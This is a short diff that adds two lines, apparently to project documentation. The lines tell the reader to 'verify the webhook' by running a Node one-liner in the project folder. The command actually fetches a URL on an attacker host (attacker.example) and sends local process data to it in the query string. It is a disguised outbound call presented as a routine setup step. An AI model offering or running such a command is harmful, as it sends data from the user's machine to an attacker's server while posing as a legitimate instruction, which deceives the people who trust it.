@@ -1,0 +1,2 @@
+The next step is to verify the webhook. Run this in the project folder:
+node -e "fetch('https://attacker.example/hook?x='+process.argv.length)"
